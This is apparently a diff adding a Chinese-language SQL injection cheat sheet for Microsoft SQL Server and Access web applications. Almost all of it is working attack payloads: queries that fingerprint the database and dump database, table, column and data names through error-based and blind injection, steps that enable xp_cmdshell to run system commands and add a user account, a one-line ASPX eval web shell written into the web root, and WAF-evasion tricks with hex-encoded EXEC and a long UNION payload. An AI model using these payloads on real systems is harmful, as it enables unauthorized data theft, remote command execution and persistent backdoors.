@@ -1,0 +1,108 @@
+id=1' and 1=1 --M
+id=1  and 1=1 
+ 
+
+判断是access还是mssql
+   asp?id=67 and exists(select * from msysobjects)>0
+   asp?id=67 and exists(select * from sysobjects)>0
+   这两条语句都运行，若是access数据库两条都报错，若是mssql 带有sysobjects的返回正常页面，带有msysobjects返回错误页面
+   或则如下 方式
+   and (select count(*) from sysobjects)>0
+
+mssql显错注入步骤
+
+1、 and @@SERVERNAME>0 爆出计算机名
+    and @@version>0    爆出版本信息
+    and db_name()>0    爆出当前数据库名
+    and user_name()>0  爆出当前用户名
+
+    判断是否站库分离
+    and @@servername=0-- 返回数据库机器名
+    and host_name()=0--  返回web机器名
+    
+    开启xp_cmdshell
+    ;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;--%20
+
+    判断命令是否执行
+    ;exec xp_cmdshell('ipconfig');--
+    
+    如果不能多执行，可尝试
+    http://192.168.52.136/mssqli.asp?name=rpc'and 'lu4n.com'=(select * from openrowset('sqloledb','trusted_connection=yes','set fmtonly off exec master..xp_cmdshell ''net user luan lu4n.com /add'''))--
+    
+    写文件
+    ;exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^> > c:\\WWW\\233.aspx' ;--
+
+   过waf
+   ;dEcLaRe @s vArChAr(8000) sEt @s=查询语句的16进制
+ eXeC(@s)--M
+2、列出数据库
+   列出第一个数据库
+   and (SELECT top 1 name FROM master.dbo.sysDatabases)>3
+   and (SELECT top 1 name FROM master..sysDatabases)>3 
+   爆出其它数据库
+   and (SELECT top 1 name FROM master..SysDatabases where name not in ('master','jtGroup','jtGroup2','model'))>0
+   另一种更为简单的方式，里面的数字递增就可以查询其它数据库
+   and db_name(1)>0 
+
+3、爆表
+   爆出第一个表 xx
+   and (select top 1 name from 数据库名.sys.all_objects where type='U' AND is_ms_shipped=0)>0
+   爆出第二个表
+   and (select top 1 name from jtGroup.sys.all_objects where type='U' AND is_ms_shipped=0 and name not in('xx'))>0
+
+   --------采用分页查询爆表(用于单引号被过滤,N表示爆出指定数据库名下的第几个表 从 1 2 3 4 依次开始爆表)-----------------------
+   And (select top 1 name from (select row_number() over( order by object_id) as rownumber,* from 数据库名.sys.all_objects where type=char(85) AND is_ms_shipped=char(48))A where rownumber=N)>0
+   以下表示爆出第13个表
+   And (select top 1 name from (select row_number() over( order by object_id) as rownumber,* from jtGroup.sys.all_objects where type=char(85))A where rownumber=13)=1
+
+
+4、爆出字段名
+   爆出第一个字段名
+   and (select top 1 COLUMN_NAME from 数据库名.information_schema.columns where TABLE_NAME='表名')>0
+   爆出其它字段名
+   and (select top 1 COLUMN_NAME from jtGroup.information_schema.columns where TABLE_NAME='Users' and column_name not in('ID','Name'))>0
+   
+   ---------采用分页查询爆字段(用于单引号被过滤,NCHAR里面是表名每个字符的ASCII码（msgbox(asc("a"))），如果是汉字则 sql下执行select unicode('管')得到编码 N表示要查询表里的第几个列名 从 1 2 3 4 5 开始)
+   And (select top 1 COLUMN_NAME from(select row_number() over( order by ORDINAL_POSITION) as rownumber,* from 数据库名.information_schema.columns where TABLE_NAME=nCHAR(85)%2bNCHAR(115)%2bnchar(101)%2bnchar(114)%2bnchar(115)) A where rownumber=N)>0
+
+
+爆出数据
+ and (select top 1 字段 from 表名)>0
+
+mssql 盲注步骤
+1、获取数据库
+ # 第一个数据库 users
+and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) >= 109
+
+# 猜解第二个数据库，N还是从1 2 3 4 开始，表示截取第二个数据库名的第几个字符
+and ascii(substring((select top 1 name from master.dbo.sysdatabases where name not in ('第一个数据库名')),N,1)) >= 65
+
+
+2、获取表
+从数据库 jtGroup 中爆 第一个表
+and ascii(substring((select top 1 name from jtGroup.sys.all_objects where type = 'U' and is_ms_shipped=0 ),1,1))>= 86
+
+获取第三个表 N第三个表名的第几位
+and ascii(substring((select top 1 name from jtGroup.sys.all_objects where type='U' AND is_ms_shipped=0 and name not in('Video','Users')),N,1))>65
+
+
+3、获取列
+获取指定表的第一个列名
+and ascii(substring((select top 1 COLUMN_NAME from 数据库名.information_schema.columns where TABLE_NAME='表名'),N,1))>65
+爆出其它列名
+and ascii(substring((select top 1 COLUMN_NAME from jtGroup.information_schema.columns where TABLE_NAME='Users' and column_name not in('ID','Name')),N,1))>65
+
+4、获取数据
+ 
+and ascii(substring((select top 1 列名 from 表名),N,1)) >= 65
+
+
+
+Union:
+%20union%20all%20SeleCt%0Aconvert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31),convert(varchar,0x31)%20 --w
+
+WAF:
+空格=/**/
+select=select%0a
+type='U' 表示查询表名 等效于 type=char(85)
+
